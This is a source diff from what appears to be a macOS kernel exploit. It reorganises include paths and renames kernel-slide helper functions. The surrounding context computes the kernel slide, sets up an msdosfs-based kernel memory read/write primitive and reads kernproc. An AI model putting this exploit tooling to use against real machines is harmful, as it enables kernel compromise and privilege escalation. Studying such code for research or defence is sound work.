@@ -16,28 +16,29 @@
 #include <sys/errno.h>
 #include <arpa/inet.h>
 
-#include "kmem.h"
-#include "kmem_remote.h"
+#include <xe/memory/kmem.h>
+#include <xe/memory/kmem_remote.h>
+#include <xe/util/ptrauth.h>
+#include <xe/util/assert.h>
+#include <xe/slider/kernel.h>
+#include <xe/slider/kext.h>
+#include <xe/xnu/proc.h>
+#include <xe/allocator/msdosfs.h>
+#include <xe/memory/kmem_msdosfs.h>
+#include <xe/util/binary.h>
+#include <xe/util/log.h>
 
 #include "external/smbfs/smb_trantcp.h"
 #include "smb/params.h"
 #include "smb/client.h"
-#include "util_ptrauth.h"
-#include "util_assert.h"
 #include "platform_params.h"
-#include "slider.h"
-#include "slider_kext.h"
-#include "xnu_proc.h"
-#include "allocator_msdosfs.h"
-#include "kmem_msdosfs.h"
+
 #include "kmem_smbiod.h"
 #include "kmem/zkext_free.h"
 #include "kmem/zkext_alloc_small.h"
 #include "kmem/allocator_rw.h"
 #include "kmem/zkext_prime_util.h"
 
-#include "util_binary.h"
-#include "util_log.h"
 
 
 #define NUM_SMB_SERVER_PORTS 64
@@ -367,8 +368,8 @@ int main(void) {
     uintptr_t mh_execute_header = VAR_MH_EXECUTE_HEADER_ADDR + text_slide;
     xe_log_debug("calculated mh_execute_header address: %p", (void*)mh_execute_header);
     
-    xe_slider_init(mh_execute_header);
-    xe_assert(xe_slider_slide(FUNC_TCP_INPUT_ADDR) == tcp_input);
+    xe_slider_kernel_init(mh_execute_header);
+    xe_assert(xe_slider_kernel_slide(FUNC_TCP_INPUT_ADDR) == tcp_input);
     xe_log_info("done initializing kernel address slider");
     
     uintptr_t proc = xe_xnu_proc_current_proc();
@@ -481,7 +482,7 @@ int main(void) {
     args.helper_mutator_ctx = NULL;
     
     xe_kmem_use_backend(xe_kmem_msdosfs_create(&args));
-    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
+    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_KERNPROC_ADDR));
     xe_assert_kaddr(kernproc);
     xe_log_info("done initializing fast msdosfsmount based kmem read writer");
     
